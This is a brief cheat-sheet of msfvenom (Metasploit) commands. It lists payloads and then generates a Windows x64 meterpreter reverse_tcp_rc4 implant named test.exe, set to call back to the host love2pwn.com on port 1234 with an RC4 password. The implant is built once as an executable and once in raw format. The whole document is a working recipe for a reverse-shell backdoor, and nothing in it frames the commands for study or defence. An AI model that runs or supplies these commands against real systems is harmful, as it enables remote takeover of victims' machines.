

msfvenom -l payloads 
msfvenom -l payloads | grep meterpreter

#Select payload and list options
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 --list-options
#Specify options for payload
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 --arch x64 --platform windows -o test.exe LHOST=love2pwn.com LPORT=1234 RC4PASSWORD=IntactSecret
#Specify output format
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 --arch x64 --platform windows -o test.exe LHOST=love2pwn.com LPORT=1234 RC4PASSWORD=IntactSecret -f raw


